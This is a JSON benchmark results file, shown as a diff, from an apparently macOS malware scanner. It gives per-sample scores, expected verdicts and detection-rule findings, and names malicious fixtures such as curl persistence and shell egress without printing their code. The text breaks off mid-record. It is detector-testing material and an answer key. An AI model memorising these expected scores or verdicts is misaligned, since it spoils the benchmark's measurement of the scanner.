@@ -1,0 +1,3725 @@
+{
+  "benchmarkRootPath" : "\/Users\/wudazi\/Beforeinstall\/benchmark",
+  "diffSummary" : {
+    "addedSamples" : [
+
+    ],
+    "comparedAt" : "2026-03-08T10:11:41Z",
+    "newlyRaisedFalseNegatives" : [
+
+    ],
+    "newlyRaisedFalsePositives" : [
+
+    ],
+    "notes" : [
+      "shared_samples=85",
+      "verdict_changes=0",
+      "score_increased=0",
+      "score_decreased=0",
+      "new_false_positives=0",
+      "new_false_negatives=0"
+    ],
+    "previousRunID" : "2026-03-08T09-56-45Z-c386f0",
+    "removedSamples" : [
+
+    ],
+    "scoreDecreasedSamples" : [
+
+    ],
+    "scoreIncreasedSamples" : [
+
+    ],
+    "topScoreChanges" : [
+      {
+        "currentScore" : 0,
+        "currentVerdict" : "clean",
+        "delta" : 0,
+        "group" : "clean",
+        "id" : "D7B1F121-1D44-47C7-A5A6-099D3B2A86F9",
+        "previousScore" : 0,
+        "previousVerdict" : "clean",
+        "sampleID" : "clean_app_manifest_01"
+      },
+      {
+        "currentScore" : 0,
+        "currentVerdict" : "clean",
+        "delta" : 0,
+        "group" : "clean",
+        "id" : "E5F36E7A-50FA-428D-A1C3-CDC6524319A5",
+        "previousScore" : 0,
+        "previousVerdict" : "clean",
+        "sampleID" : "clean_applescript_notification_01"
+      },
+      {
+        "currentScore" : 0,
+        "currentVerdict" : "clean",
+        "delta" : 0,
+        "group" : "clean",
+        "id" : "66F446B4-0AD4-4E3A-9D8A-DF98DE366518",
+        "previousScore" : 0,
+        "previousVerdict" : "clean",
+        "sampleID" : "clean_applescript_open_finder_01"
+      },
+      {
+        "currentScore" : 0,
+        "currentVerdict" : "clean",
+        "delta" : 0,
+        "group" : "clean",
+        "id" : "0130349E-0358-4050-8D5C-0AB6FF50CF6C",
+        "previousScore" : 0,
+        "previousVerdict" : "clean",
+        "sampleID" : "clean_applescript_prompt_01"
+      },
+      {
+        "currentScore" : 0,
+        "currentVerdict" : "clean",
+        "delta" : 0,
+        "group" : "clean",
+        "id" : "004D7D1D-8623-4753-8E5A-78CEA90960A3",
+        "previousScore" : 0,
+        "previousVerdict" : "clean",
+        "sampleID" : "clean_applescript_textedit_newdoc_01"
+      },
+      {
+        "currentScore" : 25,
+        "currentVerdict" : "clean",
+        "delta" : 0,
+        "group" : "clean",
+        "id" : "2CCD82CF-2B92-45A4-86E8-9029B6075ACE",
+        "previousScore" : 25,
+        "previousVerdict" : "clean",
+        "sampleID" : "clean_js_base64_demo_01"
+      },
+      {
+        "currentScore" : 10,
+        "currentVerdict" : "clean",
+        "delta" : 0,
+        "group" : "clean",
+        "id" : "8D3BED95-8440-4F2C-A52D-3A132F328BF1",
+        "previousScore" : 10,
+        "previousVerdict" : "clean",
+        "sampleID" : "clean_js_child_process_echo_01"
+      },
+      {
+        "currentScore" : 10,
+        "currentVerdict" : "clean",
+        "delta" : 0,
+        "group" : "clean",
+        "id" : "79072CC8-FD1C-47EE-A29C-952925A21B4B",
+        "previousScore" : 10,
+        "previousVerdict" : "clean",
+        "sampleID" : "clean_js_config_merge_01"
+      },
+      {
+        "currentScore" : 10,
+        "currentVerdict" : "clean",
+        "delta" : 0,
+        "group" : "clean",
+        "id" : "15FD1AE6-074D-409A-B163-B0387D06F158",
+        "previousScore" : 10,
+        "previousVerdict" : "clean",
+        "sampleID" : "clean_js_read_local_config_02"
+      },
+      {
+        "currentScore" : 0,
+        "currentVerdict" : "clean",
+        "delta" : 0,
+        "group" : "clean",
+        "id" : "CF58ADF1-6DA9-45C5-BDC7-96427C38546A",
+        "previousScore" : 0,
+        "previousVerdict" : "clean",
+        "sampleID" : "clean_pkg_receipt_stub_01"
+      },
+      {
+        "currentScore" : 0,
+        "currentVerdict" : "clean",
+        "delta" : 0,
+        "group" : "clean",
+        "id" : "029338E1-8D8E-433A-A1CB-DA7DCE9E4912",
+        "previousScore" : 0,
+        "previousVerdict" : "clean",
+        "sampleID" : "clean_plist_launchagent_template_01"
+      },
+      {
+        "currentScore" : 10,
+        "currentVerdict" : "clean",
+        "delta" : 0,
+        "group" : "clean",
+        "id" : "CECFB004-47E6-4116-96E1-BAA89B9B53AB",
+        "previousScore" : 10,
+        "previousVerdict" : "clean",
+        "sampleID" : "clean_python_config_rw_02"
+      },
+      {
+        "currentScore" : 10,
+        "currentVerdict" : "clean",
+        "delta" : 0,
+        "group" : "clean",
+        "id" : "6A68AEB8-83BA-4546-B005-19AF3256D2CC",
+        "previousScore" : 10,
+        "previousVerdict" : "clean",
+        "sampleID" : "clean_python_directory_scan_01"
+      },
+      {
+        "currentScore" : 10,
+        "currentVerdict" : "clean",
+        "delta" : 0,
+        "group" : "clean",
+        "id" : "2E54D3EB-4EC6-46B9-B9FE-97E9B044D50C",
+        "previousScore" : 10,
+        "previousVerdict" : "clean",
+        "sampleID" : "clean_python_log_rotate_01"
+      },
+      {
+        "currentScore" : 10,
+        "currentVerdict" : "clean",
+        "delta" : 0,
+        "group" : "clean",
+        "id" : "53D4D571-EB4C-4A69-9492-11A55BE79015",
+        "previousScore" : 10,
+        "previousVerdict" : "clean",
+        "sampleID" : "clean_python_subprocess_safe_01"
+      },
+      {
+        "currentScore" : 10,
+        "currentVerdict" : "clean",
+        "delta" : 0,
+        "group" : "clean",
+        "id" : "57880DDD-4039-489E-892B-7C388A3DFA02",
+        "previousScore" : 10,
+        "previousVerdict" : "clean",
+        "sampleID" : "clean_python_text_summary_01"
+      },
+      {
+        "currentScore" : 10,
+        "currentVerdict" : "clean",
+        "delta" : 0,
+        "group" : "clean",
+        "id" : "8681A88F-859F-40EE-8FD5-81BF951C15CB",
+        "previousScore" : 10,
+        "previousVerdict" : "clean",
+        "sampleID" : "clean_shell_backup_01"
+      },
+      {
+        "currentScore" : 10,
+        "currentVerdict" : "clean",
+        "delta" : 0,
+        "group" : "clean",
+        "id" : "211001FD-6D34-4B5F-9DB1-9DFBB190ED89",
+        "previousScore" : 10,
+        "previousVerdict" : "clean",
+        "sampleID" : "clean_shell_backup_02"
+      },
+      {
+        "currentScore" : 10,
+        "currentVerdict" : "clean",
+        "delta" : 0,
+        "group" : "clean",
+        "id" : "A51276AC-0B95-4929-9563-1C07A355B81C",
+        "previousScore" : 10,
+        "previousVerdict" : "clean",
+        "sampleID" : "clean_shell_log_archive_01"
+      },
+      {
+        "currentScore" : 10,
+        "currentVerdict" : "clean",
+        "delta" : 0,
+        "group" : "clean",
+        "id" : "14557350-D4FC-4746-83C7-F261ABD28648",
+        "previousScore" : 10,
+        "previousVerdict" : "clean",
+        "sampleID" : "clean_shell_open_safe_site_01"
+      }
+    ],
+    "verdictChanges" : [
+
+    ]
+  },
+  "discoveryWarnings" : [
+
+  ],
+  "errors" : [
+    {
+      "id" : "AFC4860F-3DFF-47E5-AD44-B5ED3BD70B1F",
+      "message" : "The data couldn’t be read because it is missing.",
+      "path" : "replay\/clean\/replay_clean_app_lifecycle_02.json",
+      "sampleID" : "replay_clean_app_lifecycle_02",
+      "stage" : "replay_analysis",
+      "timestamp" : "2026-03-08T10:11:33Z"
+    },
+    {
+      "id" : "4457D8D3-FC21-4DF5-9E3E-D05DFCE9190C",
+      "message" : "The data couldn’t be read because it is missing.",
+      "path" : "replay\/clean\/replay_clean_js_fetch_cache_02.json",
+      "sampleID" : "replay_clean_js_fetch_cache_02",
+      "stage" : "replay_analysis",
+      "timestamp" : "2026-03-08T10:11:33Z"
+    },
+    {
+      "id" : "DC143E6E-D7BC-45D2-B6C6-5D40C3F9E914",
+      "message" : "The data couldn’t be read because it is missing.",
+      "path" : "replay\/clean\/replay_clean_pkg_appsupport_install_02.json",
+      "sampleID" : "replay_clean_pkg_appsupport_install_02",
+      "stage" : "replay_analysis",
+      "timestamp" : "2026-03-08T10:11:33Z"
+    },
+    {
+      "id" : "11DCF122-3027-45B1-9DA7-E41FFBA3946B",
+      "message" : "The data couldn’t be read because it is missing.",
+      "path" : "replay\/clean\/replay_clean_python_scan_report_02.json",
+      "sampleID" : "replay_clean_python_scan_report_02",
+      "stage" : "replay_analysis",
+      "timestamp" : "2026-03-08T10:11:33Z"
+    },
+    {
+      "id" : "1B7DB760-1EA7-4F07-A777-22DAF0551D46",
+      "message" : "The data couldn’t be read because it is missing.",
+      "path" : "replay\/malicious\/replay_malicious_app_bash_curl_persist_02.json",
+      "sampleID" : "replay_malicious_app_bash_curl_persist_02",
+      "stage" : "replay_analysis",
+      "timestamp" : "2026-03-08T10:11:33Z"
+    },
+    {
+      "id" : "DB91114F-163B-4344-93F3-8BE3C8C487E6",
+      "message" : "The data couldn’t be read because it is missing.",
+      "path" : "replay\/malicious\/replay_malicious_app_osascript_chain_02.json",
+      "sampleID" : "replay_malicious_app_osascript_chain_02",
+      "stage" : "replay_analysis",
+      "timestamp" : "2026-03-08T10:11:33Z"
+    },
+    {
+      "id" : "3D77EF2F-DFE3-4C94-8CB4-EE2611AFDCC4",
+      "message" : "The data couldn’t be read because it is missing.",
+      "path" : "replay\/malicious\/replay_malicious_pkg_postinstall_multiegres_02.json",
+      "sampleID" : "replay_malicious_pkg_postinstall_multiegres_02",
+      "stage" : "replay_analysis",
+      "timestamp" : "2026-03-08T10:11:33Z"
+    },
+    {
+      "id" : "401D780D-9D3A-4F67-8B2C-042A612793F9",
+      "message" : "The data couldn’t be read because it is missing.",
+      "path" : "replay\/malicious\/replay_malicious_python_subprocess_priv_02.json",
+      "sampleID" : "replay_malicious_python_subprocess_priv_02",
+      "stage" : "replay_analysis",
+      "timestamp" : "2026-03-08T10:11:33Z"
+    },
+    {
+      "id" : "829C1926-DF48-44FE-87E1-9D77ECC3DDB0",
+      "message" : "The data couldn’t be read because it is missing.",
+      "path" : "replay\/suspicious\/replay_suspicious_app_shell_egress_02.json",
+      "sampleID" : "replay_suspicious_app_shell_egress_02",
+      "stage" : "replay_analysis",
+      "timestamp" : "2026-03-08T10:11:33Z"
+    },
+    {
+      "id" : "B4ED1E23-9593-4128-A8BB-EA28F9BD979F",
+      "message" : "The data couldn’t be read because it is missing.",
+      "path" : "replay\/suspicious\/replay_suspicious_pkg_persistence_mirror_02.json",
+      "sampleID" : "replay_suspicious_pkg_persistence_mirror_02",
+      "stage" : "replay_analysis",
+      "timestamp" : "2026-03-08T10:11:33Z"
+    },
+    {
+      "id" : "18A51A44-71A4-4320-BBAB-07D565AA629B",
+      "message" : "The data couldn’t be read because it is missing.",
+      "path" : "replay\/suspicious\/replay_suspicious_python_decode_plist_mirror_02.json",
+      "sampleID" : "replay_suspicious_python_decode_plist_mirror_02",
+      "stage" : "replay_analysis",
+      "timestamp" : "2026-03-08T10:11:33Z"
+    },
+    {
+      "id" : "71C207CD-D3D8-4D8F-8144-0F89DC4BA7EE",
+      "message" : "The data couldn’t be read because it is missing.",
+      "path" : "replay\/suspicious\/replay_suspicious_shell_fanout_tmp_egress_02.json",
+      "sampleID" : "replay_suspicious_shell_fanout_tmp_egress_02",
+      "stage" : "replay_analysis",
+      "timestamp" : "2026-03-08T10:11:33Z"
+    }
+  ],
+  "exportBundle" : {
+    "diffJSONPath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/results\/2026-03-08T10-11-22Z-441932\/diff.json",
+    "diffMarkdownPath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/results\/2026-03-08T10-11-22Z-441932\/diff.md",
+    "errorsJSONPath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/results\/2026-03-08T10-11-22Z-441932\/errors.json",
+    "latestPointerPath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/results\/latest.json",
+    "outputDirectoryPath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/results\/2026-03-08T10-11-22Z-441932",
+    "rawResultsPath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/results\/2026-03-08T10-11-22Z-441932\/raw_results.json",
+    "samplesCSVPath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/results\/2026-03-08T10-11-22Z-441932\/samples.csv",
+    "summaryJSONPath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/results\/2026-03-08T10-11-22Z-441932\/summary.json",
+    "summaryMarkdownPath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/results\/2026-03-08T10-11-22Z-441932\/summary.md"
+  },
+  "finishedAt" : "2026-03-08T10:11:41Z",
+  "missingRequiredDirectories" : [
+
+  ],
+  "results" : [
+    {
+      "analysisDurationMs" : 449,
+      "analysisSummary" : "未发现明显高风险行为，当前评分 0\/100，判定 Clean（低风险）。",
+      "detectedType" : "unknown",
+      "expectedScoreRange" : {
+        "max" : 10,
+        "min" : 0
+      },
+      "expectedVerdict" : "clean",
+      "findings" : [
+        "No dedicated analyzer for unknown. Fallback to generic analyzer.",
+        "generic_partial: No dedicated analyzer for unknown. Fallback to generic analyzer."
+      ],
+      "group" : "clean",
+      "matchedScoreRange" : true,
+      "matchedVerdict" : true,
+      "path" : "clean\/app\/clean_app_manifest_01.json",
+      "sampleID" : "clean_app_manifest_01",
+      "score" : 0,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:23Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 179,
+      "analysisSummary" : "未发现明显高风险行为，当前评分 0\/100，判定 Clean（低风险）。",
+      "detectedType" : "appleScript",
+      "expectedScoreRange" : {
+        "max" : 12,
+        "min" : 0
+      },
+      "expectedVerdict" : "clean",
+      "findings" : [
+        "未发现高风险规则命中",
+        "No high-risk script rule hit"
+      ],
+      "group" : "clean",
+      "matchedScoreRange" : true,
+      "matchedVerdict" : true,
+      "path" : "clean\/applescript\/clean_applescript_notification_01.applescript",
+      "sampleID" : "clean_applescript_notification_01",
+      "score" : 0,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:23Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 184,
+      "analysisSummary" : "未发现明显高风险行为，当前评分 0\/100，判定 Clean（低风险）。",
+      "detectedType" : "appleScript",
+      "expectedScoreRange" : {
+        "max" : 8,
+        "min" : 0
+      },
+      "expectedVerdict" : "clean",
+      "findings" : [
+        "检测到脚本高风险行为特征",
+        "[applescript.finder_control] 控制 Finder 行为 [low] L2-2 Δ8: tell application \"Finder\""
+      ],
+      "group" : "clean",
+      "matchedScoreRange" : true,
+      "matchedVerdict" : true,
+      "path" : "clean\/applescript\/clean_applescript_open_finder_01.applescript",
+      "sampleID" : "clean_applescript_open_finder_01",
+      "score" : 0,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:23Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 182,
+      "analysisSummary" : "未发现明显高风险行为，当前评分 0\/100，判定 Clean（低风险）。",
+      "detectedType" : "appleScript",
+      "expectedScoreRange" : {
+        "max" : 6,
+        "min" : 0
+      },
+      "expectedVerdict" : "clean",
+      "findings" : [
+        "未发现高风险规则命中",
+        "No high-risk script rule hit"
+      ],
+      "group" : "clean",
+      "matchedScoreRange" : true,
+      "matchedVerdict" : true,
+      "path" : "clean\/applescript\/clean_applescript_prompt_01.applescript",
+      "sampleID" : "clean_applescript_prompt_01",
+      "score" : 0,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:23Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 183,
+      "analysisSummary" : "未发现明显高风险行为，当前评分 0\/100，判定 Clean（低风险）。",
+      "detectedType" : "appleScript",
+      "expectedScoreRange" : {
+        "max" : 8,
+        "min" : 0
+      },
+      "expectedVerdict" : "clean",
+      "findings" : [
+        "未发现高风险规则命中",
+        "No high-risk script rule hit"
+      ],
+      "group" : "clean",
+      "matchedScoreRange" : true,
+      "matchedVerdict" : true,
+      "path" : "clean\/applescript\/clean_applescript_textedit_newdoc_01.applescript",
+      "sampleID" : "clean_applescript_textedit_newdoc_01",
+      "score" : 0,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:23Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 178,
+      "analysisSummary" : "该样本检测到编码\/混淆后执行行为，存在规避审计迹象。；未获取到可执行样本签名信息。。综合评分 25\/100，判定 Clean（低风险）。",
+      "detectedType" : "javaScript",
+      "expectedScoreRange" : {
+        "max" : 15,
+        "min" : 3
+      },
+      "expectedVerdict" : "clean",
+      "findings" : [
+        "检测到混淆或编码逃逸",
+        "[javascript.base64_obfuscation] Buffer\/base64 混淆痕迹 [medium] L3-3 Δ14: const encoded = Buffer.from(source, 'utf8').toString('base64');",
+        "[javascript.base64_obfuscation] Buffer\/base64 混淆痕迹 [medium] L4-4 Δ14: const decoded = Buffer.from(encoded, 'base64').toString('utf8');"
+      ],
+      "group" : "clean",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : true,
+      "mismatchReason" : "score_too_high",
+      "path" : "clean\/js\/clean_js_base64_demo_01.js",
+      "sampleID" : "clean_js_base64_demo_01",
+      "score" : 25,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:24Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 178,
+      "analysisSummary" : "该样本未获取到可执行样本签名信息。。综合评分 10\/100，判定 Clean（低风险）。",
+      "detectedType" : "javaScript",
+      "expectedScoreRange" : {
+        "max" : 18,
+        "min" : 5
+      },
+      "expectedVerdict" : "clean",
+      "findings" : [
+        "检测到脚本高风险行为特征",
+        "[javascript.child_process] Node child_process 执行链 [high] L2-2 Δ22: const { execFile } = require('child_process');",
+        "[javascript.child_process] Node child_process 执行链 [high] L12-12 Δ22: console.log('[clean] child_process output:', stdout.trim());",
+        "Script analyzer detected 2 high-severity findings.",
+        "generic_partial: Script analyzer detected 2 high-severity findings."
+      ],
+      "group" : "clean",
+      "matchedScoreRange" : true,
+      "matchedVerdict" : true,
+      "path" : "clean\/js\/clean_js_child_process_echo_01.js",
+      "sampleID" : "clean_js_child_process_echo_01",
+      "score" : 10,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:24Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 179,
+      "analysisSummary" : "该样本未获取到可执行样本签名信息。。综合评分 10\/100，判定 Clean（低风险）。",
+      "detectedType" : "javaScript",
+      "expectedScoreRange" : {
+        "max" : 12,
+        "min" : 0
+      },
+      "expectedVerdict" : "clean",
+      "findings" : [
+        "未发现高风险规则命中",
+        "No high-risk script rule hit"
+      ],
+      "group" : "clean",
+      "matchedScoreRange" : true,
+      "matchedVerdict" : true,
+      "path" : "clean\/js\/clean_js_config_merge_01.js",
+      "sampleID" : "clean_js_config_merge_01",
+      "score" : 10,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:24Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 173,
+      "analysisSummary" : "该样本未获取到可执行样本签名信息。。综合评分 10\/100，判定 Clean（低风险）。",
+      "detectedType" : "javaScript",
+      "expectedScoreRange" : {
+        "max" : 8,
+        "min" : 0
+      },
+      "expectedVerdict" : "clean",
+      "findings" : [
+        "未发现高风险规则命中",
+        "No high-risk script rule hit"
+      ],
+      "group" : "clean",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : true,
+      "mismatchReason" : "score_too_high",
+      "path" : "clean\/js\/clean_js_read_local_config_02.js",
+      "sampleID" : "clean_js_read_local_config_02",
+      "score" : 10,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:24Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 417,
+      "analysisSummary" : "未发现明显高风险行为，当前评分 0\/100，判定 Clean（低风险）。",
+      "detectedType" : "unknown",
+      "expectedScoreRange" : {
+        "max" : 10,
+        "min" : 0
+      },
+      "expectedVerdict" : "clean",
+      "findings" : [
+        "No dedicated analyzer for unknown. Fallback to generic analyzer.",
+        "generic_partial: No dedicated analyzer for unknown. Fallback to generic analyzer."
+      ],
+      "group" : "clean",
+      "matchedScoreRange" : true,
+      "matchedVerdict" : true,
+      "path" : "clean\/pkg\/clean_pkg_receipt_stub_01.json",
+      "sampleID" : "clean_pkg_receipt_stub_01",
+      "score" : 0,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:24Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 418,
+      "analysisSummary" : "未发现明显高风险行为，当前评分 0\/100，判定 Clean（低风险）。",
+      "detectedType" : "plist",
+      "expectedScoreRange" : {
+        "max" : 18,
+        "min" : 0
+      },
+      "expectedVerdict" : "clean",
+      "findings" : [
+        "No dedicated analyzer for plist. Fallback to generic analyzer.",
+        "generic_partial: No dedicated analyzer for plist. Fallback to generic analyzer."
+      ],
+      "group" : "clean",
+      "matchedScoreRange" : true,
+      "matchedVerdict" : true,
+      "path" : "clean\/plist\/clean_plist_launchagent_template_01.plist",
+      "sampleID" : "clean_plist_launchagent_template_01",
+      "score" : 0,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:25Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 174,
+      "analysisSummary" : "该样本未获取到可执行样本签名信息。。综合评分 10\/100，判定 Clean（低风险）。",
+      "detectedType" : "pythonScript",
+      "expectedScoreRange" : {
+        "max" : 12,
+        "min" : 0
+      },
+      "expectedVerdict" : "clean",
+      "findings" : [
+        "未发现高风险规则命中",
+        "No high-risk script rule hit"
+      ],
+      "group" : "clean",
+      "matchedScoreRange" : true,
+      "matchedVerdict" : true,
+      "path" : "clean\/python\/clean_python_config_rw_02.py",
+      "sampleID" : "clean_python_config_rw_02",
+      "score" : 10,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:25Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 176,
+      "analysisSummary" : "该样本未获取到可执行样本签名信息。。综合评分 10\/100，判定 Clean（低风险）。",
+      "detectedType" : "pythonScript",
+      "expectedScoreRange" : {
+        "max" : 10,
+        "min" : 0
+      },
+      "expectedVerdict" : "clean",
+      "findings" : [
+        "未发现高风险规则命中",
+        "No high-risk script rule hit"
+      ],
+      "group" : "clean",
+      "matchedScoreRange" : true,
+      "matchedVerdict" : true,
+      "path" : "clean\/python\/clean_python_directory_scan_01.py",
+      "sampleID" : "clean_python_directory_scan_01",
+      "score" : 10,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:25Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 173,
+      "analysisSummary" : "该样本未获取到可执行样本签名信息。。综合评分 10\/100，判定 Clean（低风险）。",
+      "detectedType" : "pythonScript",
+      "expectedScoreRange" : {
+        "max" : 15,
+        "min" : 0
+      },
+      "expectedVerdict" : "clean",
+      "findings" : [
+        "未发现高风险规则命中",
+        "No high-risk script rule hit"
+      ],
+      "group" : "clean",
+      "matchedScoreRange" : true,
+      "matchedVerdict" : true,
+      "path" : "clean\/python\/clean_python_log_rotate_01.py",
+      "sampleID" : "clean_python_log_rotate_01",
+      "score" : 10,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:25Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 179,
+      "analysisSummary" : "该样本未获取到可执行样本签名信息。。综合评分 10\/100，判定 Clean（低风险）。",
+      "detectedType" : "pythonScript",
+      "expectedScoreRange" : {
+        "max" : 18,
+        "min" : 5
+      },
+      "expectedVerdict" : "clean",
+      "findings" : [
+        "检测到混淆或编码逃逸",
+        "[python.subprocess_exec] subprocess 外部进程执行 [high] L11-11 Δ20: result = subprocess.run(cmd, check=True, capture_output=True, text=True)",
+        "Script analyzer detected 1 high-severity findings.",
+        "generic_partial: Script analyzer detected 1 high-severity findings."
+      ],
+      "group" : "clean",
+      "matchedScoreRange" : true,
+      "matchedVerdict" : true,
+      "path" : "clean\/python\/clean_python_subprocess_safe_01.py",
+      "sampleID" : "clean_python_subprocess_safe_01",
+      "score" : 10,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:26Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 183,
+      "analysisSummary" : "该样本未获取到可执行样本签名信息。。综合评分 10\/100，判定 Clean（低风险）。",
+      "detectedType" : "pythonScript",
+      "expectedScoreRange" : {
+        "max" : 8,
+        "min" : 0
+      },
+      "expectedVerdict" : "clean",
+      "findings" : [
+        "未发现高风险规则命中",
+        "No high-risk script rule hit"
+      ],
+      "group" : "clean",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : true,
+      "mismatchReason" : "score_too_high",
+      "path" : "clean\/python\/clean_python_text_summary_01.py",
+      "sampleID" : "clean_python_text_summary_01",
+      "score" : 10,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:26Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 180,
+      "analysisSummary" : "该样本未获取到可执行样本签名信息。。综合评分 10\/100，判定 Clean（低风险）。",
+      "detectedType" : "shellScript",
+      "expectedScoreRange" : {
+        "max" : 15,
+        "min" : 0
+      },
+      "expectedVerdict" : "clean",
+      "findings" : [
+        "未发现高风险规则命中",
+        "No high-risk script rule hit"
+      ],
+      "group" : "clean",
+      "matchedScoreRange" : true,
+      "matchedVerdict" : true,
+      "path" : "clean\/shell\/clean_shell_backup_01.sh",
+      "sampleID" : "clean_shell_backup_01",
+      "score" : 10,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:26Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 182,
+      "analysisSummary" : "该样本未获取到可执行样本签名信息。。综合评分 10\/100，判定 Clean（低风险）。",
+      "detectedType" : "shellScript",
+      "expectedScoreRange" : {
+        "max" : 12,
+        "min" : 0
+      },
+      "expectedVerdict" : "clean",
+      "findings" : [
+        "未发现高风险规则命中",
+        "No high-risk script rule hit"
+      ],
+      "group" : "clean",
+      "matchedScoreRange" : true,
+      "matchedVerdict" : true,
+      "path" : "clean\/shell\/clean_shell_backup_02.sh",
+      "sampleID" : "clean_shell_backup_02",
+      "score" : 10,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:26Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 179,
+      "analysisSummary" : "该样本未获取到可执行样本签名信息。。综合评分 10\/100，判定 Clean（低风险）。",
+      "detectedType" : "shellScript",
+      "expectedScoreRange" : {
+        "max" : 12,
+        "min" : 0
+      },
+      "expectedVerdict" : "clean",
+      "findings" : [
+        "未发现高风险规则命中",
+        "No high-risk script rule hit"
+      ],
+      "group" : "clean",
+      "matchedScoreRange" : true,
+      "matchedVerdict" : true,
+      "path" : "clean\/shell\/clean_shell_log_archive_01.sh",
+      "sampleID" : "clean_shell_log_archive_01",
+      "score" : 10,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:26Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 180,
+      "analysisSummary" : "该样本未获取到可执行样本签名信息。。综合评分 10\/100，判定 Clean（低风险）。",
+      "detectedType" : "shellScript",
+      "expectedScoreRange" : {
+        "max" : 8,
+        "min" : 0
+      },
+      "expectedVerdict" : "clean",
+      "findings" : [
+        "未发现高风险规则命中",
+        "No high-risk script rule hit"
+      ],
+      "group" : "clean",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : true,
+      "mismatchReason" : "score_too_high",
+      "path" : "clean\/shell\/clean_shell_open_safe_site_01.sh",
+      "sampleID" : "clean_shell_open_safe_site_01",
+      "score" : 10,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:26Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 183,
+      "analysisSummary" : "该样本未获取到可执行样本签名信息。。综合评分 10\/100，判定 Clean（低风险）。",
+      "detectedType" : "shellScript",
+      "expectedScoreRange" : {
+        "max" : 14,
+        "min" : 0
+      },
+      "expectedVerdict" : "clean",
+      "findings" : [
+        "未发现高风险规则命中",
+        "No high-risk script rule hit"
+      ],
+      "group" : "clean",
+      "matchedScoreRange" : true,
+      "matchedVerdict" : true,
+      "path" : "clean\/shell\/clean_shell_write_test_plist_01.sh",
+      "sampleID" : "clean_shell_write_test_plist_01",
+      "score" : 10,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:27Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 1615,
+      "analysisSummary" : "该样本样本可执行但未签名，来源可信度不足。。综合评分 10\/100，判定 Clean（低风险）。",
+      "detectedType" : "appBundle",
+      "expectedScoreRange" : {
+        "max" : 30,
+        "min" : 12
+      },
+      "expectedVerdict" : "benign_noisy",
+      "findings" : [
+        "未获取到 Entitlements，权限边界不可完全判断",
+        "无法完整读取签名信息：\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/app\/NoisyUtilityFixture_01.app: code object is not signed at all",
+        "未提取到 Entitlements（可能该应用未声明或无法读取）",
+        "generic_partial: 无法完整读取签名信息：\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/app\/NoisyUtilityFixture_01.app: code object is not signed at all",
+        "generic_partial: 未提取到 Entitlements（可能该应用未声明或无法读取）"
+      ],
+      "group" : "noisy_benign",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : true,
+      "mismatchReason" : "score_too_low",
+      "path" : "noisy_benign\/app\/NoisyUtilityFixture_01.app",
+      "sampleID" : "noisy_app_bundle_fixture_01",
+      "score" : 10,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:28Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 438,
+      "analysisSummary" : "未发现明显高风险行为，当前评分 0\/100，判定 Clean（低风险）。",
+      "detectedType" : "unknown",
+      "expectedScoreRange" : {
+        "max" : 38,
+        "min" : 18
+      },
+      "expectedVerdict" : "benign_noisy",
+      "findings" : [
